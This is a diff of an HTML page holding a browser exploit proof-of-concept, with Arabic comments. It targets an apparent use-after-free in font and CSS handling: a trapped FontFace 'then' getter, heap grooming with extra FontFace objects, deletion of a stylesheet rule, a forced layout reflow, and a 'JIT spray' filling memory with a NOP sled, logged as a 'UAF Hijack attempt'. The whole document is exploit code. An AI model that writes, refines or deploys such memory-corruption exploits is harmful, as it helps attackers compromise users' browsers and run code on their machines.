@@ -15,86 +15,52 @@
             logBox.innerHTML += `<div>[${time}ms] ${msg}</div>`;
             logBox.scrollTop = logBox.scrollHeight;
         }
-        
-        // أضف هذه الدالة قبل الـ window.onload
-function jitSpray() {
-    let code = new Uint32Array(0x1000);
-    // نملأ الذاكرة بـ NOP Sled أو عنوان وهمي نتحكم به
-    code.fill(0x90909090); 
-    return code;
-}
 
-// داخل الـ object.defineProperty (في مكان الـ TRAP):
-get() {
-    if (!fired && this === A) {
-        fired = true;
-        
-        // 1. تفعيل رش الـ JIT
-        jitSpray();
-        
-        // 2. تدمير الكائن الأصلي
-        document.getElementById('s').sheet.deleteRule(0);
-        
-        // 3. هنا اللحظة الحرجة: نحاول إجبار المحرك على استخدام عنواننا
-        // بدلاً من الـ layout reflow، نستخدم استدعاءً يسبب خطأ في الوصول للذاكرة
-        try {
-            document.body.offsetTop;
-        } catch(e) {}
-        
-        debug("CRITICAL: UAF Hijack attempt triggered.");
-    }
-    return undefined;
-}
-
+        // دالة رش الذاكرة (JIT Spraying)
+        function jitSpray() {
+            debug("Applying JIT Memory Spray...");
+            let code = new Uint32Array(0x1000);
+            code.fill(0x90909090); // NOP Sled: الهدف هو خداع مؤشر التنفيذ
+            return code;
+        }
 
         window.onload = () => {
-            // في بداية الـ onload
-if (window.gc) {
-    debug("Manual Garbage Collection triggered.");
-    window.gc(); 
-}
+            debug("System Initialized. Starting Aggressive PoC...");
 
-            debug("System Initialized. Loading PoC sequence...");
-
-            // 1. تعريف الكائن A
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
             void A.loaded;
-            debug("FontFace 'A' created and added.");
 
             let fired = false;
-            // 2. الفخ (Trap) على دالة then
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
                     if (!fired && this === A) {
                         fired = true;
-                        debug("!!! TRAP HIT: then() accessed !!!");
+                        debug("!!! TRAP HIT: Initiating JIT Hijack !!!");
                         
-                        // 3. تطبيق منطق الـ PoC الأصلي (Heap Manipulation)
-                        debug("Injecting FontFace 'y' and 'z' for Heap Grooming...");
+                        // 1. تفعيل الرش في لحظة الـ Trap
+                        jitSpray();
+                        
+                        // 2. إنشاء كائنات تضخيم
                         new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                         new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                         
-                        debug("Executing Rule Deletion (deleteRule(0))...");
+                        // 3. حذف القاعدة وإحداث الانهيار
                         document.getElementById('s').sheet.deleteRule(0);
                         
-                        debug("Triggering Layout Reflow (offsetTop)...");
-                        document.body.offsetTop;
+                        try {
+                            document.body.offsetTop;
+                        } catch(e) {}
                         
-                        debug("UAF Sequence completed.");
+                        debug("CRITICAL: UAF Hijack attempt triggered.");
                     }
                     return undefined;
                 }
             });
 
-            // 4. إطلاق عملية التحميل
-            debug("Calling document.fonts.load('1em x', 'AB')...");
-            document.fonts.load('1em x', 'AB').then(() => {
-                debug("Result: Load Success.");
-            }).catch((e) => {
-                debug("Result: Load Rejected: " + e.message);
-            });
+            debug("Loading font 'x'...");
+            document.fonts.load('1em x', 'AB').catch(e => debug("Result: " + e.message));
         };
     </script>
 </body>
